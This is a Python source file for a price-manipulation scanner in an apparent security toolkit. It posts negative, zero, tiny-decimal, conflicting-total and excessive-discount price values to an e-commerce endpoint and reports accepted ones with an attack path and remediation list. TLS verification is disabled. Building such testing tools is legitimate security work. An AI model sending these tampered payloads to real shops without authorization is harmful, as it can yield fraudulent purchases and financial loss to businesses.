#!/usr/bin/env python3
"""
REVUEX - Price Manipulation Scanner
E-commerce Security Testing & Price Tampering Detection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
Use extreme caution - price manipulation testing can affect real transactions.
"""

import requests
import json
import time
from pathlib import Path
import re
from decimal import Decimal

class PriceManipulationScanner:
    """E-commerce price manipulation vulnerability scanner"""
    
    def __init__(self, endpoint, workspace, delay=3):
        """
        Initialize Price Manipulation Scanner
        
        Args:
            endpoint: Target e-commerce endpoint
            workspace: Workspace directory
            delay: Extra safety delay between tests
        """
        self.endpoint = endpoint
        self.workspace = Path(workspace)
        self.delay = delay
        
        self.headers = {
            'User-Agent': 'REVUEX-PriceScanner/1.0 (Security Research; +https://github.com/G33L0)',
            'Content-Type': 'application/json'
        }
        
        # Test payloads for price manipulation
        self.test_cases = {
            'negative_price': {
                'description': 'Negative price values',
                'payloads': [-1, -0.01, -100, -999.99]
            },
            'zero_price': {
                'description': 'Zero price values',
                'payloads': [0, 0.00, 0.0]
            },
            'decimal_precision': {
                'description': 'Decimal precision abuse',
                'payloads': [0.001, 0.0001, 0.00001, 1.999999]
            },
            'large_discount': {
                'description': 'Excessive discount percentages',
                'payloads': [100, 101, 150, 200, 999, -50]
            },
            'currency_manipulation': {
                'description': 'Currency code manipulation',
                'payloads': ['USD', 'EUR', 'GBP', 'XXX', '', 'null']
            },
            'quantity_overflow': {
                'description': 'Quantity overflow/underflow',
                'payloads': [-1, 0, 999999, 2147483647, -2147483648]
            },
            'bundle_price': {
                'description': 'Bundle price manipulation',
                'payloads': [
                    {'item1': 100, 'item2': 50, 'bundle_total': 10},
                    {'items': 3, 'price_per_item': 100, 'total': 1}
                ]
            }
        }
    
    def test(self):
        """Test for price manipulation vulnerabilities"""
        print(f"            [!] CAUTION: Testing price manipulation on {self.endpoint}")
        print(f"            [!] Using {self.delay}s safety delay")
        
        vulnerability = {
            'type': 'Price Manipulation',
            'severity': 'High',
            'endpoint': self.endpoint,
            'exploitable': False,
            'evidence': '',
            'test_results': {}
        }
        
        # Test 1: Negative prices
        print(f"            → Test 1: Negative price values")
        negative_result = self._test_negative_prices()
        vulnerability['test_results']['negative_prices'] = negative_result
        
        time.sleep(self.delay)
        
        # Test 2: Zero prices
        print(f"            → Test 2: Zero price values")
        zero_result = self._test_zero_prices()
        vulnerability['test_results']['zero_prices'] = zero_result
        
        time.sleep(self.delay)
        
        # Test 3: Decimal precision
        print(f"            → Test 3: Decimal precision abuse")
        decimal_result = self._test_decimal_precision()
        vulnerability['test_results']['decimal_precision'] = decimal_result
        
        time.sleep(self.delay)
        
        # Test 4: Parameter tampering
        print(f"            → Test 4: Parameter tampering")
        tampering_result = self._test_parameter_tampering()
        vulnerability['test_results']['parameter_tampering'] = tampering_result
        
        time.sleep(self.delay)
        
        # Test 5: Currency manipulation
        print(f"            → Test 5: Currency manipulation")
        currency_result = self._test_currency_manipulation()
        vulnerability['test_results']['currency'] = currency_result
        
        # Determine if exploitable
        if any([
            negative_result.get('vulnerable'),
            zero_result.get('vulnerable'),
            decimal_result.get('vulnerable'),
            tampering_result.get('vulnerable'),
            currency_result.get('vulnerable')
        ]):
            vulnerability['exploitable'] = True
            vulnerability['severity'] = 'Critical'
            vulnerability['evidence'] = 'Price manipulation vulnerabilities detected'
            vulnerability['description'] = 'E-commerce endpoint accepts manipulated price values'
            vulnerability['attack_path'] = [
                'Intercept purchase/checkout request',
                'Modify price parameters (negative, zero, or reduced values)',
                'Submit manipulated request',
                'Purchase items for incorrect prices',
                'Cause financial loss to business'
            ]
            vulnerability['remediation'] = [
                'NEVER trust client-side price values',
                'Always recalculate prices server-side',
                'Validate all price inputs (reject negative, zero if invalid)',
                'Use server-side price database as source of truth',
                'Implement price range validation',
                'Log all price-related transactions',
                'Add anomaly detection for unusual purchases',
                'Use cryptographic signatures for price integrity',
                'Implement cart validation before checkout',
                'Add manual review for suspicious orders'
            ]
        else:
            vulnerability['description'] = 'No price manipulation vulnerabilities detected'
            vulnerability['evidence'] = 'Endpoint properly validates price parameters'
            vulnerability['remediation'] = [
                'Continue server-side price validation',
                'Regular security testing',
                'Monitor for anomalous transactions'
            ]
        
        vulnerability['tags'] = ['ecommerce', 'payment', 'business_logic', 'price_manipulation']
        
        # Save results
        self._save_results(vulnerability)
        
        return vulnerability
    
    def _test_negative_prices(self):
        """Test negative price values"""
        results = {
            'vulnerable': False,
            'method': 'negative_prices',
            'tests': []
        }
        
        for price in self.test_cases['negative_price']['payloads']:
            try:
                # Test as JSON payload
                payload = {
                    'price': price,
                    'amount': price,
                    'total': price,
                    'item_id': 'test_item',
                    'quantity': 1
                }
                
                response = requests.post(
                    self.endpoint,
                    headers=self.headers,
                    json=payload,
                    timeout=10,
                    verify=False
                )
                
                # Check if negative price was accepted
                accepted = response.status_code in [200, 201, 202]
                
                test_result = {
                    'price': price,
                    'status_code': response.status_code,
                    'accepted': accepted,
                    'response_preview': response.text[:200]
                }
                
                results['tests'].append(test_result)
                
                if accepted:
                    results['vulnerable'] = True
                    results['evidence'] = f'Negative price {price} was accepted'
                
                time.sleep(0.5)  # Small delay between tests
                
            except Exception as e:
                results['tests'].append({
                    'price': price,
                    'error': str(e)
                })
        
        return results
    
    def _test_zero_prices(self):
        """Test zero price values"""
        results = {
            'vulnerable': False,
            'method': 'zero_prices',
            'tests': []
        }
        
        for price in self.test_cases['zero_price']['payloads']:
            try:
                payload = {
                    'price': price,
                    'total': price,
                    'item_id': 'test_item',
                    'quantity': 1
                }
                
                response = requests.post(
                    self.endpoint,
                    headers=self.headers,
                    json=payload,
                    timeout=10,
                    verify=False
                )
                
                accepted = response.status_code in [200, 201, 202]
                
                test_result = {
                    'price': price,
                    'status_code': response.status_code,
                    'accepted': accepted
                }
                
                results['tests'].append(test_result)
                
                if accepted:
                    results['vulnerable'] = True
                    results['evidence'] = f'Zero price {price} was accepted'
                
                time.sleep(0.5)
                
            except Exception as e:
                results['tests'].append({
                    'price': price,
                    'error': str(e)
                })
        
        return results
    
    def _test_decimal_precision(self):
        """Test decimal precision abuse"""
        results = {
            'vulnerable': False,
            'method': 'decimal_precision',
            'tests': []
        }
        
        for price in self.test_cases['decimal_precision']['payloads']:
            try:
                payload = {
                    'price': price,
                    'amount': price,
                    'item_id': 'test_item',
                    'quantity': 1000  # Large quantity to amplify effect
                }
                
                response = requests.post(
                    self.endpoint,
                    headers=self.headers,
                    json=payload,
                    timeout=10,
                    verify=False
                )
                
                accepted = response.status_code in [200, 201, 202]
                
                test_result = {
                    'price': price,
                    'quantity': 1000,
                    'expected_total': price * 1000,
                    'status_code': response.status_code,
                    'accepted': accepted
                }
                
                results['tests'].append(test_result)
                
                # Decimal precision bugs can cause rounding errors
                if accepted and price < 0.01:
                    results['vulnerable'] = True
                    results['evidence'] = f'Tiny price {price} accepted, could cause rounding to zero'
                
                time.sleep(0.5)
                
            except Exception as e:
                results['tests'].append({
                    'price': price,
                    'error': str(e)
                })
        
        return results
    
    def _test_parameter_tampering(self):
        """Test parameter tampering"""
        results = {
            'vulnerable': False,
            'method': 'parameter_tampering',
            'tests': []
        }
        
        # Test: Send conflicting price parameters
        tampering_tests = [
            {
                'name': 'Conflicting prices',
                'payload': {
                    'price': 1.00,
                    'unit_price': 1.00,
                    'total': 0.01,  # Conflict: should be 1.00
                    'quantity': 1
                }
            },
            {
                'name': 'Discount overflow',
                'payload': {
                    'original_price': 100,
                    'discount_percent': 200,  # 200% discount
                    'final_price': -100
                }
            },
            {
                'name': 'Quantity-price mismatch',
                'payload': {
                    'item_price': 50,
                    'quantity': 10,
                    'total': 1  # Should be 500
                }
            }
        ]
        
        for test in tampering_tests:
            try:
                response = requests.post(
                    self.endpoint,
                    headers=self.headers,
                    json=test['payload'],
                    timeout=10,
                    verify=False
                )
                
                accepted = response.status_code in [200, 201, 202]
                
                test_result = {
                    'test_name': test['name'],
                    'payload': test['payload'],
                    'status_code': response.status_code,
                    'accepted': accepted
                }
                
                results['tests'].append(test_result)
                
                if accepted:
                    results['vulnerable'] = True
                    results['evidence'] = f'{test["name"]}: Conflicting parameters accepted'
                
                time.sleep(1)
                
            except Exception as e:
                results['tests'].append({
                    'test_name': test['name'],
                    'error': str(e)
                })
        
        return results
    
    def _test_currency_manipulation(self):
        """Test currency code manipulation"""
        results = {
            'vulnerable': False,
            'method': 'currency_manipulation',
            'tests': []
        }
        
        for currency in self.test_cases['currency_manipulation']['payloads']:
            try:
                payload = {
                    'price': 100,
                    'currency': currency,
                    'item_id': 'test_item'
                }
                
                response = requests.post(
                    self.endpoint,
                    headers=self.headers,
                    json=payload,
                    timeout=10,
                    verify=False
                )
                
                accepted = response.status_code in [200, 201, 202]
                
                test_result = {
                    'currency': currency,
                    'status_code': response.status_code,
                    'accepted': accepted
                }
                
                results['tests'].append(test_result)
                
                # Invalid currency codes should be rejected
                if accepted and currency in ['XXX', '', 'null']:
                    results['vulnerable'] = True
                    results['evidence'] = f'Invalid currency "{currency}" was accepted'
                
                time.sleep(0.5)
                
            except Exception as e:
                results['tests'].append({
                    'currency': currency,
                    'error': str(e)
                })
        
        return results
    
    def _save_results(self, vulnerability):
        """Save price manipulation test results"""
        price_dir = self.workspace / "price_manipulation_tests"
        price_dir.mkdir(exist_ok=True)
        
        # Safe filename from endpoint
        safe_name = re.sub(r'[^\w\-]', '_', self.endpoint)
        output_file = price_dir / f"{safe_name}_price_test.json"
        
        with open(output_file, 'w') as f:
            json.dump(vulnerability, f, indent=2)
